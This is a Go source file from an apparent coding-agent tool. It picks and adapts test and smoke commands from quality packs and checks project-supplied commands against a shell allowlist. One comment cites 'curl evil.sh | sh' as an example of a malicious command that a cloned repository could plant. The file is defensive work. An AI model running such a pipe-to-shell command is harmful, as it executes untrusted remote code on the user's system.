package blocks

import (
	"os"
	"path/filepath"
	"strings"

	"github.com/UnicoLab/slmcode/pkg/workspace"
)

// resolveQualityBlock returns the quality block that should drive this
// workspace. It prefers the active pack's quality block ONLY when that block
// still detects in the workspace — otherwise it falls back to auto-detection so
// a stale active_pack (e.g. "python" left over from a prior run) never forces a
// mismatched gate (pytest on a Go/JS/HTML project) onto the current task.
func resolveQualityBlock(projectRoot, workspaceRoot, activePack string) *QualityBlock {
	reg, err := Load(projectRoot)
	if err != nil || reg == nil {
		return nil
	}
	if activePack != "" {
		if pack, ok := reg.GetPack(activePack); ok && pack.Spec.Quality != "" {
			if q, ok := reg.GetQuality(pack.Spec.Quality); ok && q.DetectsIn(workspaceRoot) {
				return q
			}
		}
		if q, ok := reg.GetQuality(activePack); ok && q.DetectsIn(workspaceRoot) {
			return q
		}
	}
	return reg.DetectQuality(workspaceRoot)
}

// ResolveQAGateCommand returns the QA gate from the active pack or auto-detect.
// Falls back to empty when no quality block matches (caller uses legacy detect).
func ResolveQAGateCommand(projectRoot, workspaceRoot, activePack string) string {
	q := resolveQualityBlock(projectRoot, workspaceRoot, activePack)
	if q == nil {
		return ""
	}
	return vetBlockCommand(q, adaptGate(workspaceRoot, q.PrimaryQAGate()))
}

// ResolveSmokeCommand returns the post-worker / project smoke from quality packs.
func ResolveSmokeCommand(projectRoot, workspaceRoot, activePack string) string {
	q := resolveQualityBlock(projectRoot, workspaceRoot, activePack)
	if q == nil {
		return ""
	}
	smoke := strings.TrimSpace(q.Spec.Smoke)
	if smoke == "" {
		smoke = q.PrimaryQAGate()
	}
	return vetBlockCommand(q, adaptGate(workspaceRoot, smoke))
}

// SafePrefixesFromPack returns extra acceptance command prefixes from quality packs.
func SafePrefixesFromPack(projectRoot, activePack string) []string {
	reg, err := Load(projectRoot)
	if err != nil || reg == nil {
		return nil
	}
	var q *QualityBlock
	if activePack != "" {
		if pack, ok := reg.GetPack(activePack); ok && pack.Spec.Quality != "" {
			q, _ = reg.GetQuality(pack.Spec.Quality)
		}
		if q == nil {
			q, _ = reg.GetQuality(activePack)
		}
	}
	if q == nil {
		return nil
	}
	if q.Source == SourceProject {
		// A repo-supplied block must not be able to widen the shell whitelist
		// it is itself measured against — that is the whole guard, in one
		// yaml key. Only an operator-installed (builtin/user) pack may.
		return nil
	}
	return append([]string{}, q.Spec.SafePrefixes...)
}

// vetBlockCommand gates a command that came out of a quality BLOCK.
//
// Quality blocks are discovered from .slmcode/blocks/quality/*.yaml, which
// lives INSIDE the project. Auto-detection needs no operator action, so a
// cloned repository could ship `qa_gate: curl evil.sh | sh` and the QA gate
// would run it. A project-sourced command therefore has to clear the same
// ws_shell allowlist the agent's own commands do — which still passes every
// gate a quality block legitimately wants (`go test ./...`, `npm test`,
// `python -m pytest -q`, `cargo test`).
//
// Builtin and user-installed blocks are operator-chosen and pass unchanged.
func vetBlockCommand(q *QualityBlock, cmd string) string {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" || q == nil || q.Source != SourceProject {
		return cmd
	}
	if _, blocked := workspace.GuardShellWhitelist(cmd, nil); blocked {
		return ""
	}
	return cmd
}

// adaptGate rewrites a quality pack's static command for the build tool the
// workspace actually uses. A pack ships ONE string, but "run the tests" is
// spelled differently depending on a lockfile or a wrapper script that is not
// knowable when the pack is authored: pnpm vs npm, Gradle vs Maven, uv vs
// poetry vs bare pytest. Handing a Gradle project `mvn -q -B test` produces a
// command-not-found that the model then tries to "fix" in the source tree.
func adaptGate(root, gate string) string {
	gate = strings.TrimSpace(gate)
	if gate == "" || root == "" {
		return ""
	}
	for _, adapt := range []func(string, string) string{
		adaptPythonGate, adaptNodeGate, adaptJVMGate, adaptRubyGate,
	} {
		gate = adapt(root, gate)
	}
	return gate
}

// adaptPythonGate prefers the project's dependency manager so the test run sees
// the locked environment rather than whatever is on the ambient PATH.
func adaptPythonGate(root, gate string) string {
	if !strings.Contains(gate, "pytest") || strings.Contains(gate, " run ") {
		return gate
	}
	rest, ok := strings.CutPrefix(gate, "python -m ")
	if !ok {
		if rest, ok = strings.CutPrefix(gate, "python3 -m "); !ok {
			return gate
		}
	}
	switch {
	case fileExists(filepath.Join(root, "uv.lock")):
		return "uv run " + rest
	case fileExists(filepath.Join(root, "poetry.lock")):
		return "poetry run " + rest
	}
	return gate
}

// adaptNodeGate swaps the package manager named by the lockfile. Only the
// gate/smoke command reaches here, so the rewrite is confined to `npm test`
// forms whose flags every manager accepts.
func adaptNodeGate(root, gate string) string {
	if !strings.HasPrefix(gate, "npm test") {
		return gate
	}
	rest := strings.TrimPrefix(gate, "npm test")
	switch {
	case fileExists(filepath.Join(root, "pnpm-lock.yaml")):
		return "pnpm test" + rest
	case fileExists(filepath.Join(root, "yarn.lock")):
		// Yarn Classic has no --silent on `yarn test`; drop the flags.
		return "yarn test"
	case fileExists(filepath.Join(root, "bun.lockb")), fileExists(filepath.Join(root, "bun.lock")):
		// `bun test` is Bun's OWN runner, not the package.json script — running
		// it would silently ignore the project's configured test command.
		return "bun run test"
	}
	return gate
}

// adaptJVMGate routes between Maven and Gradle, preferring a checked-in wrapper
// over an ambient install (the wrapper pins the version the build needs).
func adaptJVMGate(root, gate string) string {
	has := func(name string) bool { return fileExists(filepath.Join(root, name)) }
	hasGradle := has("build.gradle") || has("build.gradle.kts")
	switch {
	case strings.HasPrefix(gate, "mvn "):
		if !has("pom.xml") && hasGradle {
			return "./gradlew test --console=plain"
		}
		if has("mvnw") {
			return "./" + gate
		}
	case strings.HasPrefix(gate, "./gradlew "):
		if !has("gradlew") {
			if has("pom.xml") {
				return "mvn -q -B test"
			}
			if hasGradle {
				return "gradle" + strings.TrimPrefix(gate, "./gradlew")
			}
		}
	}
	return gate
}

// adaptRubyGate falls back from RSpec to Minitest when the repo has no spec/.
func adaptRubyGate(root, gate string) string {
	if !strings.HasPrefix(gate, "bundle exec rspec") {
		return gate
	}
	if dirExists(filepath.Join(root, "spec")) {
		return gate
	}
	if fileExists(filepath.Join(root, "Rakefile")) {
		return "bundle exec rake test"
	}
	return gate
}

func dirExists(path string) bool {
	st, err := os.Stat(path)
	return err == nil && st.IsDir()
}

func fileExists(path string) bool {
	st, err := os.Stat(path)
	return err == nil && !st.IsDir()
}
